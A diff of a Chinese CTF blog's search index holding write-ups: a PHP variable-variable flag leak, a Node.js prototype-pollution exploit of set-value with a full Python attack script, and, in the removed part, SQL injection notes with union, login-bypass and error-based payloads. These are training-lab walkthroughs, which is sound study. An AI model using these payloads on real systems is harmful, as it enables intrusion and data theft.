@@ -141,6 +141,75 @@
       </tags>
   </entry>
   <entry>
+    <title>BJDCTF2020-Mark-loves-cat</title>
+    <url>/2020/06/23/BJDCTF2020-Mark-loves-cat/</url>
+    <content><![CDATA[<p>稍微记录下吧，题目不难，主要是php了解的还是太少</p>
+<p>题目知识点：.git泄露，php代码审计，可变变量</p>
+<p>首先题目给了一个写的很好看的前端，拉到最底下看到一个dog</p>
+<p>一开始也没啥思路，后来扫了下发现有.git源码泄露，主要代码如下</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"></span><br><span class="line">$yds = <span class="string">"dog"</span>;</span><br><span class="line">$is = <span class="string">"cat"</span>;</span><br><span class="line">$handsome = <span class="string">'yds'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $$y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    <span class="keyword">if</span>($_GET[<span class="string">'flag'</span>] === $x &amp;&amp; $x !== <span class="string">'flag'</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>($handsome);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'flag'</span>]) &amp;&amp; !<span class="keyword">isset</span>($_POST[<span class="string">'flag'</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>($yds);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'flag'</span>] === <span class="string">'flag'</span>  || $_GET[<span class="string">'flag'</span>] === <span class="string">'flag'</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>($is);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"the flag is: "</span>.$flag;</span><br></pre></td></tr></table></figure>
+
+<p>来稍微讲讲这段代码吧，自己php也懂得不多，也是一步步调试才看懂的（我太菜了.jpg）</p>
+<p>首先是foreach这个函数，这里拿get这段来将吧，post这题其实用不到</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $$y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>当这里输入 <code>xxx/?yds=flag</code> 后，括号中的$x为yds，$y为flag；然后里面的$$x表示$yds，$$y表示$flag，这个时候就把flag的值赋给了yds</p>
+<p>这就是所谓的可变变量，就是把一个变量的值变为另一个变量的名字</p>
+<p>这题只要输入这个就出结果了，因为下面的三个exit中，只会执行这一段</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'flag'</span>]) &amp;&amp; !<span class="keyword">isset</span>($_POST[<span class="string">'flag'</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>($yds);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>因为我们传入的get参数中没有flag，也没post传入任何参数，所以就直接带着$yds退出了，而yds中之前就保存了flag的值，到这里也就出结果了</p>
+<p>最后附上一些调试截图方便理解</p>
+<p><img src="/2020/06/23/BJDCTF2020-Mark-loves-cat/1.png" alt></p>
+<p>执行完get的foreach，此时yds变量已经变成了flag的值</p>
+<p><img src="/2020/06/23/BJDCTF2020-Mark-loves-cat/2.png" alt></p>
+<p>不会执行其他的exit因为都不满足条件，此时就会带着yds，也就是flag的值退出</p>
+<p><img src="/2020/06/23/BJDCTF2020-Mark-loves-cat/3.png" alt></p>
+]]></content>
+      <categories>
+        <category>学习记录</category>
+      </categories>
+      <tags>
+        <tag>php代码审计</tag>
+        <tag>wp</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Bugku-sodirty</title>
+    <url>/2021/02/26/Bugku-sodirty/</url>
+    <content><![CDATA[<p>是道nodejs原型链污染题，之前一直觉得好难没有学习过，今天大致看了下，稍微能看懂一点了，主要还参考了<a href="https://www.wlhhlc.top/posts/49040/#sodirty" target="_blank" rel="noopener">dota_st</a>师傅的这个wp，师傅tql</p>
+<p>这里也就简单写写吧，首先是个简单的页面，有个注册功能，扫描下路径得到<code>www.zip</code>的源码，找到里面的<code>index.js</code>源码</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">const</span> setFn = <span class="built_in">require</span>(<span class="string">'set-value'</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.Router();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> Admin = &#123;</span><br><span class="line">    <span class="string">"password"</span>:process.env.password?process.env.password:<span class="string">"password"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.post(<span class="string">"/getflag"</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (req.body.password === <span class="literal">undefined</span> || req.body.password === req.session.challenger.password)&#123;</span><br><span class="line">        res.send(<span class="string">"登录失败"</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(req.session.challenger.age &gt; <span class="number">79</span>)&#123;</span><br><span class="line">            res.send(<span class="string">"糟老头子坏滴很"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">let</span> key = req.body.key.toString();</span><br><span class="line">        <span class="keyword">let</span> password = req.body.password.toString();</span><br><span class="line">        <span class="keyword">if</span>(Admin[key] === password)&#123;</span><br><span class="line">            res.send(process.env.flag ? process.env.flag : <span class="string">"flag&#123;test&#125;"</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            res.send(<span class="string">"密码错误，请使用管理员用户名登录."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line">router.get(<span class="string">'/reg'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">    req.session.challenger = &#123;</span><br><span class="line">        <span class="string">"username"</span>: <span class="string">"user"</span>,</span><br><span class="line">        <span class="string">"password"</span>: <span class="string">"pass"</span>,</span><br><span class="line">        <span class="string">"age"</span>: <span class="number">80</span></span><br><span class="line">    &#125;</span><br><span class="line">    res.send(<span class="string">"用户创建成功!"</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">router.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">    res.redirect(<span class="string">'index'</span>);</span><br><span class="line">&#125;);</span><br><span class="line">router.get(<span class="string">'/index'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">    res.send(<span class="string">'&lt;title&gt;BUGKU-登录&lt;/title&gt;&lt;h1&gt;前端被炒了&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;a href="./reg"&gt;注册&lt;/a&gt;'</span>);</span><br><span class="line">&#125;);</span><br><span class="line">router.post(<span class="string">"/update"</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(req.session.challenger === <span class="literal">undefined</span>)&#123;</span><br><span class="line">        res.redirect(<span class="string">'/reg'</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (req.body.attrkey === <span class="literal">undefined</span> || req.body.attrval === <span class="literal">undefined</span>) &#123;</span><br><span class="line">            res.send(<span class="string">"传参有误"</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">let</span> key = req.body.attrkey.toString();</span><br><span class="line">            <span class="keyword">let</span> value = req.body.attrval.toString();</span><br><span class="line">            setFn(req.session.challenger, key, value);</span><br><span class="line">            res.send(<span class="string">"修改成功"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = router;</span><br></pre></td></tr></table></figure>
+
+<p>之前完全不会js，百度了下大概知道了代码中的一些意思</p>
+<p>首先最关键的就是找到原型链污染的点，这里是<code>setFn(req.session.challenger, key, value);</code>这里，具体的poc是这个</p>
+<blockquote>
+<p><a href="https://snyk.io/vuln/SNYK-JS-SETVALUE-45021" target="_blank" rel="noopener">https://snyk.io/vuln/SNYK-JS-SETVALUE-45021</a></p>
+</blockquote>
+<p>即</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> setFn = <span class="built_in">require</span>(<span class="string">'set-value'</span>);</span><br><span class="line">setFn(&#123;&#125;,<span class="string">'__proto__.p1'</span>,<span class="string">"hacked"</span>);</span><br><span class="line"><span class="built_in">console</span>.log(&#123;&#125;.p1);</span><br></pre></td></tr></table></figure>
+
+<p>通过setFn后，这里obj对象的原形中p1的值就变成了hacked，使别的对象也能访问到这个变量p1和它的值，因为nodejs访问变量是层层递进的，自己没有就去原型中找</p>
+<p>然后就是关于<code>req.body</code>，这个是nodejs中取参的一种方式，类似php的$_GET，<code>req.body.attrval.toString();</code>就表示接受用户传入的attrval变量，具体可以看看<a href="https://www.cnblogs.com/abdm-989/p/11930335.html" target="_blank" rel="noopener">这个</a></p>
+<p>接下来看代码</p>
+<p>可以看到最关键的/getflag部分，需要绕过两个地方，一个是age要小于79，还有一个就是<code>Admin[key]===password</code></p>
+<p><code>age</code>很好绕，只要通过update改掉就行了</p>
+<p><code>Admin</code>中只有一个属性，就是键<code>process.env.password</code>中的值<code>password</code>，很显然，我们并不知道系统变量中password的值，所以我们必须往原型链的下一个object对象中添加一个键和值，这也就可以是Admin[我们传入的key]===我们传入的password了</p>
+<p>脚本如下</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line">header = &#123;<span class="string">'Content-Type'</span>: <span class="string">'application/json'</span>&#125; <span class="comment">#header类型必须设置为json</span></span><br><span class="line">url = <span class="string">'http://114.67.246.176:13093/'</span></span><br><span class="line"></span><br><span class="line">r = s.get(url+<span class="string">'reg'</span>) <span class="comment">#必须先注册，不然下一步会被重定向到reg</span></span><br><span class="line">print(r.text)</span><br><span class="line"></span><br><span class="line">payload1 = &#123;<span class="string">'attrkey'</span>: <span class="string">'__proto__.pwd'</span>,</span><br><span class="line">            <span class="string">'attrval'</span>: <span class="string">'123'</span>&#125;  <span class="comment"># 增加原型链下一个object的pwd属性值为123，因为原型链一直会向下查找，所以可以找到Admin['pwd']属性的值</span></span><br><span class="line">r = s.post(url=url + <span class="string">'update'</span>, headers=header, json=payload1)</span><br><span class="line">print(r.text)</span><br><span class="line"></span><br><span class="line">payload2 = &#123;<span class="string">'attrkey'</span>: <span class="string">'age'</span>,</span><br><span class="line">            <span class="string">'attrval'</span>: <span class="string">'10'</span>&#125;  <span class="comment"># 修改年龄</span></span><br><span class="line">r = s.post(url=url + <span class="string">'update'</span>, headers=header, json=payload2)</span><br><span class="line">print(r.text)</span><br><span class="line"></span><br><span class="line">payload3 = &#123;<span class="string">'key'</span>: <span class="string">'pwd'</span>, <span class="string">'password'</span>: <span class="string">'123'</span>&#125;  <span class="comment"># 传入key和password</span></span><br><span class="line">r = s.post(url=url + <span class="string">'getflag'</span>, headers=header, json=payload3)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>
+
+<p>结果</p>
+<p><img src="/2021/02/26/Bugku-sodirty/1.png" alt="1"></p>
+]]></content>
+      <categories>
+        <category>学习记录</category>
+      </categories>
+      <tags>
+        <tag>writeup</tag>
+        <tag>nodejs</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>[BJDCTF2020]EasySearch</title>
     <url>/2020/07/17/BJDCTF2020-EasySearch/</url>
     <content><![CDATA[<p>这道题是今年bjdctf第一次比赛的题，一道挺不错的简单题目，又学到了不少姿势。</p>
@@ -183,40 +252,6 @@
         <tag>wp</tag>
         <tag>web</tag>
         <tag>源码泄露</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>BJDCTF2020-Mark-loves-cat</title>
-    <url>/2020/06/23/BJDCTF2020-Mark-loves-cat/</url>
-    <content><![CDATA[<p>稍微记录下吧，题目不难，主要是php了解的还是太少</p>
-<p>题目知识点：.git泄露，php代码审计，可变变量</p>
-<p>首先题目给了一个写的很好看的前端，拉到最底下看到一个dog</p>
-<p>一开始也没啥思路，后来扫了下发现有.git源码泄露，主要代码如下</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"></span><br><span class="line">$yds = <span class="string">"dog"</span>;</span><br><span class="line">$is = <span class="string">"cat"</span>;</span><br><span class="line">$handsome = <span class="string">'yds'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $$y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    <span class="keyword">if</span>($_GET[<span class="string">'flag'</span>] === $x &amp;&amp; $x !== <span class="string">'flag'</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>($handsome);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'flag'</span>]) &amp;&amp; !<span class="keyword">isset</span>($_POST[<span class="string">'flag'</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>($yds);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'flag'</span>] === <span class="string">'flag'</span>  || $_GET[<span class="string">'flag'</span>] === <span class="string">'flag'</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>($is);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"the flag is: "</span>.$flag;</span><br></pre></td></tr></table></figure>
-
-<p>来稍微讲讲这段代码吧，自己php也懂得不多，也是一步步调试才看懂的（我太菜了.jpg）</p>
-<p>首先是foreach这个函数，这里拿get这段来将吧，post这题其实用不到</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $$y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>当这里输入 <code>xxx/?yds=flag</code> 后，括号中的$x为yds，$y为flag；然后里面的$$x表示$yds，$$y表示$flag，这个时候就把flag的值赋给了yds</p>
-<p>这就是所谓的可变变量，就是把一个变量的值变为另一个变量的名字</p>
-<p>这题只要输入这个就出结果了，因为下面的三个exit中，只会执行这一段</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'flag'</span>]) &amp;&amp; !<span class="keyword">isset</span>($_POST[<span class="string">'flag'</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>($yds);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>因为我们传入的get参数中没有flag，也没post传入任何参数，所以就直接带着$yds退出了，而yds中之前就保存了flag的值，到这里也就出结果了</p>
-<p>最后附上一些调试截图方便理解</p>
-<p><img src="/2020/06/23/BJDCTF2020-Mark-loves-cat/1.png" alt></p>
-<p>执行完get的foreach，此时yds变量已经变成了flag的值</p>
-<p><img src="/2020/06/23/BJDCTF2020-Mark-loves-cat/2.png" alt></p>
-<p>不会执行其他的exit因为都不满足条件，此时就会带着yds，也就是flag的值退出</p>
-<p><img src="/2020/06/23/BJDCTF2020-Mark-loves-cat/3.png" alt></p>
-]]></content>
-      <categories>
-        <category>学习记录</category>
-      </categories>
-      <tags>
-        <tag>php代码审计</tag>
-        <tag>wp</tag>
       </tags>
   </entry>
   <entry>
@@ -311,92 +346,6 @@
       <tags>
         <tag>writeup</tag>
         <tag>php</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Bugku-sodirty</title>
-    <url>/2021/02/26/Bugku-sodirty/</url>
-    <content><![CDATA[<p>是道nodejs原型链污染题，之前一直觉得好难没有学习过，今天大致看了下，稍微能看懂一点了，主要还参考了<a href="https://www.wlhhlc.top/posts/49040/#sodirty" target="_blank" rel="noopener">dota_st</a>师傅的这个wp，师傅tql</p>
-<p>这里也就简单写写吧，首先是个简单的页面，有个注册功能，扫描下路径得到<code>www.zip</code>的源码，找到里面的<code>index.js</code>源码</p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">const</span> setFn = <span class="built_in">require</span>(<span class="string">'set-value'</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.Router();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> Admin = &#123;</span><br><span class="line">    <span class="string">"password"</span>:process.env.password?process.env.password:<span class="string">"password"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.post(<span class="string">"/getflag"</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (req.body.password === <span class="literal">undefined</span> || req.body.password === req.session.challenger.password)&#123;</span><br><span class="line">        res.send(<span class="string">"登录失败"</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(req.session.challenger.age &gt; <span class="number">79</span>)&#123;</span><br><span class="line">            res.send(<span class="string">"糟老头子坏滴很"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">let</span> key = req.body.key.toString();</span><br><span class="line">        <span class="keyword">let</span> password = req.body.password.toString();</span><br><span class="line">        <span class="keyword">if</span>(Admin[key] === password)&#123;</span><br><span class="line">            res.send(process.env.flag ? process.env.flag : <span class="string">"flag&#123;test&#125;"</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            res.send(<span class="string">"密码错误，请使用管理员用户名登录."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line">router.get(<span class="string">'/reg'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">    req.session.challenger = &#123;</span><br><span class="line">        <span class="string">"username"</span>: <span class="string">"user"</span>,</span><br><span class="line">        <span class="string">"password"</span>: <span class="string">"pass"</span>,</span><br><span class="line">        <span class="string">"age"</span>: <span class="number">80</span></span><br><span class="line">    &#125;</span><br><span class="line">    res.send(<span class="string">"用户创建成功!"</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">router.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">    res.redirect(<span class="string">'index'</span>);</span><br><span class="line">&#125;);</span><br><span class="line">router.get(<span class="string">'/index'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">    res.send(<span class="string">'&lt;title&gt;BUGKU-登录&lt;/title&gt;&lt;h1&gt;前端被炒了&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;a href="./reg"&gt;注册&lt;/a&gt;'</span>);</span><br><span class="line">&#125;);</span><br><span class="line">router.post(<span class="string">"/update"</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(req.session.challenger === <span class="literal">undefined</span>)&#123;</span><br><span class="line">        res.redirect(<span class="string">'/reg'</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (req.body.attrkey === <span class="literal">undefined</span> || req.body.attrval === <span class="literal">undefined</span>) &#123;</span><br><span class="line">            res.send(<span class="string">"传参有误"</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">let</span> key = req.body.attrkey.toString();</span><br><span class="line">            <span class="keyword">let</span> value = req.body.attrval.toString();</span><br><span class="line">            setFn(req.session.challenger, key, value);</span><br><span class="line">            res.send(<span class="string">"修改成功"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = router;</span><br></pre></td></tr></table></figure>
-
-<p>之前完全不会js，百度了下大概知道了代码中的一些意思</p>
-<p>首先最关键的就是找到原型链污染的点，这里是<code>setFn(req.session.challenger, key, value);</code>这里，具体的poc是这个</p>
-<blockquote>
-<p><a href="https://snyk.io/vuln/SNYK-JS-SETVALUE-45021" target="_blank" rel="noopener">https://snyk.io/vuln/SNYK-JS-SETVALUE-45021</a></p>
-</blockquote>
-<p>即</p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> setFn = <span class="built_in">require</span>(<span class="string">'set-value'</span>);</span><br><span class="line">setFn(&#123;&#125;,<span class="string">'__proto__.p1'</span>,<span class="string">"hacked"</span>);</span><br><span class="line"><span class="built_in">console</span>.log(&#123;&#125;.p1);</span><br></pre></td></tr></table></figure>
-
-<p>通过setFn后，这里obj对象的原形中p1的值就变成了hacked，使别的对象也能访问到这个变量p1和它的值，因为nodejs访问变量是层层递进的，自己没有就去原型中找</p>
-<p>然后就是关于<code>req.body</code>，这个是nodejs中取参的一种方式，类似php的$_GET，<code>req.body.attrval.toString();</code>就表示接受用户传入的attrval变量，具体可以看看<a href="https://www.cnblogs.com/abdm-989/p/11930335.html" target="_blank" rel="noopener">这个</a></p>
-<p>接下来看代码</p>
-<p>可以看到最关键的/getflag部分，需要绕过两个地方，一个是age要小于79，还有一个就是<code>Admin[key]===password</code></p>
-<p><code>age</code>很好绕，只要通过update改掉就行了</p>
-<p><code>Admin</code>中只有一个属性，就是键<code>process.env.password</code>中的值<code>password</code>，很显然，我们并不知道系统变量中password的值，所以我们必须往原型链的下一个object对象中添加一个键和值，这也就可以是Admin[我们传入的key]===我们传入的password了</p>
-<p>脚本如下</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line">header = &#123;<span class="string">'Content-Type'</span>: <span class="string">'application/json'</span>&#125; <span class="comment">#header类型必须设置为json</span></span><br><span class="line">url = <span class="string">'http://114.67.246.176:13093/'</span></span><br><span class="line"></span><br><span class="line">r = s.get(url+<span class="string">'reg'</span>) <span class="comment">#必须先注册，不然下一步会被重定向到reg</span></span><br><span class="line">print(r.text)</span><br><span class="line"></span><br><span class="line">payload1 = &#123;<span class="string">'attrkey'</span>: <span class="string">'__proto__.pwd'</span>,</span><br><span class="line">            <span class="string">'attrval'</span>: <span class="string">'123'</span>&#125;  <span class="comment"># 增加原型链下一个object的pwd属性值为123，因为原型链一直会向下查找，所以可以找到Admin['pwd']属性的值</span></span><br><span class="line">r = s.post(url=url + <span class="string">'update'</span>, headers=header, json=payload1)</span><br><span class="line">print(r.text)</span><br><span class="line"></span><br><span class="line">payload2 = &#123;<span class="string">'attrkey'</span>: <span class="string">'age'</span>,</span><br><span class="line">            <span class="string">'attrval'</span>: <span class="string">'10'</span>&#125;  <span class="comment"># 修改年龄</span></span><br><span class="line">r = s.post(url=url + <span class="string">'update'</span>, headers=header, json=payload2)</span><br><span class="line">print(r.text)</span><br><span class="line"></span><br><span class="line">payload3 = &#123;<span class="string">'key'</span>: <span class="string">'pwd'</span>, <span class="string">'password'</span>: <span class="string">'123'</span>&#125;  <span class="comment"># 传入key和password</span></span><br><span class="line">r = s.post(url=url + <span class="string">'getflag'</span>, headers=header, json=payload3)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>
-
-<p>结果</p>
-<p><img src="/2021/02/26/Bugku-sodirty/1.png" alt="1"></p>
-]]></content>
-      <categories>
-        <category>学习记录</category>
-      </categories>
-      <tags>
-        <tag>writeup</tag>
-        <tag>nodejs</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>SQL注入一</title>
-    <url>/2020/06/22/SQL%E6%B3%A8%E5%85%A5%E4%B8%80/</url>
-    <content><![CDATA[<h3 id="1-sql注入步骤开始清晰（整型注入）"><a href="#1-sql注入步骤开始清晰（整型注入）" class="headerlink" title="1.sql注入步骤开始清晰（整型注入）"></a>1.sql注入步骤开始清晰（整型注入）</h3><p>​        union select 的作用是将两次查询结果和为一次再输出，先用union select *，*，*…等来判断字段列数，无报错及说明字段名猜测成功，之后再让前面查询的id查不出来（id输入很大或者可以and 0），即可只显示union select的内容。前台返回结果并不是表真实列数，再查看哪个字段有回显，即前台显示的是哪几个字段内容。</p>
-<p>​        Mysql所有内容都存储于information_schema库中，里面有三个重要字段schemamata(存放所有数据库信息schema_name)，tables(存放所有数据库中的表名 table_name，table_schema表所属数据库名)，columns(存放前包含前两者的东西加上字段名column_name，内容最为详细).<br>​        Group_concat语句用于将所有查询出来的内容拼为一行，不然只会显示一个数据，如<code>Group_concat（schema_name）</code><br>​        Database（）用于查询当前数据库名称，如<code>select 1,database(),3 from information_schema.schemata（可以不加from）</code><br>​        知道数据库之后可以开始查询当前数据库所有表名，语句为 <code>select group_concat(table_name) from information_schema.tables where table_schema=database()</code><br>​        知道表名后可以开始查询当前表中所有字段名，语句为<code>select group_concat(column_name) from information_schema.columns where table_schema=database() and tablename=xxx(自己想查的表)</code><br>​        知道字段名称可以开始查数据了,语句为select 1,group_contact(字段名)，3 from 查出来数据库名.表名<br>​        Contact_ws函数用于将两个字段一起显示，例 <code>concat_ws(‘:’,user,pwd)</code>就是将两个字段以冒号分隔一起显示，想显示所有再在外面加<code>group_concat(concat_ws(&#39;:&#39;,user,pwd))</code><br>​        快速判断几列可以用order by，原理：order by x(数字)将会按照第x列来进行排序，超过了便会报错，所以能够快速确定列数</p>
-<h3 id="2-基于报错的GET单引号双引号注入"><a href="#2-基于报错的GET单引号双引号注入" class="headerlink" title="2.基于报错的GET单引号双引号注入"></a>2.基于报错的GET单引号双引号注入</h3><p>​        在id=x后面加单（双引号）观察是否会报错，根据报错语句来实行注入，让我们自己的语句能够闭合（加单双引号，括号等），同时将后面的语句注释掉，一般可以用的方式有加/**/(基本用不上)，–+（加号等于空格），%23（#的url编码，直接输入不会被转义所以要这样），从而实现注入</p>
-<h3 id="3-基于报错的POST单引号双引号注入"><a href="#3-基于报错的POST单引号双引号注入" class="headerlink" title="3.基于报错的POST单引号双引号注入"></a>3.基于报错的POST单引号双引号注入</h3><p>（以前写的，仅针对当时看的例子，很多地方表述不清，见谅）</p>
-<p>​        一般为登陆界面，也是单双引号，不能在url中输入，需要在账户名密码中进行注入，在username中进行注入是，由于不知道账户是否存在，应该在username里闭合后加上 or 1，让其永远为真 ，这里的注释符号跟上面相同，但要多试几次，因为可能会被url转义，#可以直接用，不再需要变成23%，注释掉后sql语句中便不再判断密码，即可登陆成功（在用hackbar的时候passwd一般不能少）</p>
-<h3 id="4-基于报错的POST双注入"><a href="#4-基于报错的POST双注入" class="headerlink" title="4.基于报错的POST双注入"></a>4.基于报错的POST双注入</h3><p>​        由于有时候加只加单引号或者双引号不能根据报错得到我们想知道的东西，所以有时候需要单双引号一起用，再根据报错来判断sql语句，实现注入。<br>​        知道用户名的情况下可以不用加or 1，就会登陆到当前用户名账户。使用之前的方式，发现order by判断列数成功后，union select却不回显数据，就需要 用到双注入。<br>​        先自己尝试，在mysql中自己查询数据发现</p>
-<p><img src="/2020/06/22/SQL%E6%B3%A8%E5%85%A5%E4%B8%80/s1.png" alt="s1"></p>
-<p>​        group by之后直接查询所有数据只会返回分类后的第一条。<br>​        Group by 后面如果加数字，那么就是根据select中的东西作为主键，如下图</p>
-<p><img src="/2020/06/22/SQL%E6%B3%A8%E5%85%A5%E4%B8%80/s2.png" alt="s2"></p>
-<p>Group by 1就是以table_schema作为主键，2就是count（*）<br>        使用group by * 会新生成一个临时表，临时表中*为主键，不能重复，所以利用这一特性，可以用rand函数实现注入，让其出错，从而从报错信息中获取数据，具体payload如下<br><code>Union select table_schema,count(*) from information_schema.tables group by concat(floor(rand()*2),version());</code> </p>
